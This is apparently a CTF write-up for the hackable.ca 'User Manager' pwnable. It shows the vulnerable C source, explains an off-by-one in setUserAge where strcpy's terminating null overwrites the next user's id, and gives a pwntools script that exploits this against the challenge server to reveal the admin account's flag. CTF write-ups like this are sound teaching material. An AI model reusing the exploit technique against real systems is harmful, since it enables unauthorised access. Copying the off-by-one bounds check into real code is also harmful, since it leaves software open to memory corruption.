Title: Hackable.ca User Manager
Date: 2018-8-3 10:02
Modified: 2018-8-3  10:02
Category: ctf
Tags: ctf, pwnable, binary exploitation
Slug: hackable_ca_userManager
Authors: F3real
Summary: How to solve hackable.ca User Manager


Today we take a look at another interesting challenge from [hackable.ca](www.hackable.ca). Like usual we are given source code and binary. So let’s look at source first:

~~~c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

const char *mainMenuText =
    "     MAIN MENU      \n"
    "--------------------\n"
    "1 - view user       \n"
    "2 - create user     \n"
    "3 - exit            \n"
    "\n> ";

const char *userMenuText =
    "--------------------\n"
    "1 - change username \n"
    "2 - change email    \n"
    "3 - change age      \n"
    "4 - change password \n"
    "5 - RETURN          \n"
    "\n> ";

typedef struct user
{
    int id;
    char *username;
    char *email;
    char *password;
    char age[8];
} user;

int current_user = -1;
user users[32];
int first_empty_user = 0;

void userInputLine(char inputBuf[], char *parameter)
{
    size_t size;

    printf("\n\n%s> ", parameter);
    fflush(stdout);

    inputBuf[0] = 0;
    scanf(" %255[^\n]", inputBuf);
}

void viewUser()
{
    char inputLine[256];
    userInputLine(inputLine, "name of user");

    for (int i = 0; i < first_empty_user; i++)
        if (strcmp(users[i].username, inputLine) == 0)
            current_user = users[i].id;

    if (current_user == -1)
        puts("No user by that name");
}

void setUserName()
{
    char inputLine[256];
    size_t size;

    if (users[current_user].username != NULL)
        free(users[current_user].username);

    userInputLine(inputLine, "set usernme");
    size = strlen(inputLine);
    users[current_user].username = malloc(size + 1);
    strcpy(users[current_user].username, inputLine);
}

void setUserEmail()
{
    char inputLine[256];
    size_t size;

    if (users[current_user].email != NULL)
        free(users[current_user].email);

    userInputLine(inputLine, "set email");
    size = strlen(inputLine);
    users[current_user].email = malloc(size + 1);
    strcpy(users[current_user].email, inputLine);
}

void setUserAge()
{
    char inputLine[256];
    size_t maxage;
    userInputLine(inputLine, "set age");

    maxage = sizeof(users[current_user].age);
    if (strlen(inputLine) > maxage)
        inputLine[maxage - 1] = 0;

    strcpy(users[current_user].age, inputLine);
}

void setUserPassword()
{
    char inputLine[256];
    size_t size;

    if (users[current_user].password != NULL)
        free(users[current_user].password);

    userInputLine(inputLine, "set password");
    size = strlen(inputLine);
    users[current_user].password = malloc(size + 1);
    strcpy(users[current_user].password, inputLine);
}

void displayUserInfo()
{
    printf("username: %s\n", users[current_user].username);
    printf("   email: %s\n", users[current_user].email);
    printf("     age: %s\n", users[current_user].age);
    printf("password: %s\n", users[current_user].password);
}

int createSystemAccount()
{
    if (first_empty_user != 0)
        return 1;

    int newID = first_empty_user++;

    users[newID].id = newID;
    users[newID].username = "admin_account_-_unknown_name";
    users[newID].email = "root@localhost";
    users[newID].password = "flag{REMOVED_FROM_THIS_VERSION}";
    strcpy(users[newID].age, "99");

    return 0;
}

int main()
{
    if (createSystemAccount())
        return 0;

    int menuOption;

    while (1)
    {
        puts("\n\n\n\n\n================================");
        if (current_user == -1)
        {
            printf("%s", mainMenuText);
            fflush(stdout);
            scanf("%d", &menuOption);
            switch (menuOption)
            {
            case 1:
                viewUser();
                break;
            case 2:
                if (first_empty_user > 31)
                {
                    puts("sorry, too many users");
                }
                else
                {
                    current_user = first_empty_user++;
                    users[current_user].id = current_user;
                    users[current_user].username = NULL;
                    users[current_user].email = NULL;
                    users[current_user].password = NULL;
                    setUserName();
                    setUserEmail();
                    setUserAge();
                    setUserPassword();
                }
                break;
            case 3:
                return 0;
                break;
            }
        }
        else
        {
            displayUserInfo();
            printf("%s", userMenuText);
            fflush(stdout);
            scanf("%d", &menuOption);
            switch (menuOption)
            {
            case 1:
                setUserName();
                break;
            case 2:
                setUserEmail();
                break;
            case 3:
                setUserAge();
                break;
            case 4:
                setUserPassword();
                break;
            case 5:
                current_user = -1;
                break;
            }
        }
    }
}
~~~

At first look there are no obvious bugs, no obvious buffer overflows or format string exploits. Looking trough code I noticed that only function that stands out is `setUserAge` since it doesn’t allocate memory dynamically and it does different checks. So lets examine it more carefully:

~~~c
    void setUserAge() 
    {                          
     char inputLine[256];                        
     size_t maxage;                        
     userInputLine(inputLine, "set age");
     maxage = sizeof(users[current_user].age);
     if (strlen(inputLine) > maxage)                               
         inputLine[maxage - 1] = 0;                                                   
     strcpy(users[current_user].age, inputLine);                       
    }
~~~

At first function looks safe, but if we take a look at docs of `strlen` and `strcpy` we see:

    The C library function size_t **strlen**(const char *str) computes the length of the string str up to, **but not including the terminating null character.**

    The **strcpy**() function copies the string pointed by source (**including the null character**) to the character array destination.

And since functions only checks for `len > maxage` if we insert `8 * a` (8 is the size of buffer holding age) check will still pass. This will cause `strcpy` to copy 9 bytes to destination buffer overwriting one byte of data. If we take a look at user struct we will see that it will overwrite `id` of next user since they are stored in array.

Looking at how `viewUser()` and `displayUserInfo()` work. We see that `viewUser()` sets `current_user` to id of first user with the given name, while `displayUserInfo()` uses that `current_user` as index to user array. This means that if we create user, overwrite his `id` to 0, then select him program will actually print information of systemAccount giving us flag. So let’s write short script implementing this (although in this case, it is easy to do manually as well):

~~~python
from pwn import *

context.arch = 'i386'
#r = process('./usermanager')
r = remote('pwnable.hackable.ca', 9995)

#create 2 users a1 and a2
for i in range(1, 3):
	r.recvuntil('> ')
	r.sendline('2')
	r.recvuntil('set usernme> ')
	r.sendline('a'+str(i))
	r.recvuntil('set email> ')
	r.sendline('a')
	r.recvuntil('set age> ')
	r.sendline('a')
	r.recvuntil('set password> ')
	r.sendline('a')
	r.sendline('5')
#change age of user a1
r.recvuntil('> ')
r.sendline('1')
r.recvuntil('name of user> ')
r.sendline('a1')
r.recvuntil('> ')
r.sendline('3')
r.recvuntil('set age> ')
r.sendline('a'*8)
#get our flag
r.recvuntil('> ')
r.sendline('5')
r.recvuntil('> ')
r.sendline('1')
r.recvuntil('name of user> ')
r.sendline('a2')
print r.recvuntil('> ')
r.close()
~~~

And we get the flag :D

![flag]({static}/images/2018_8_3_UserManager.png){: .img-fluid .centerimage}
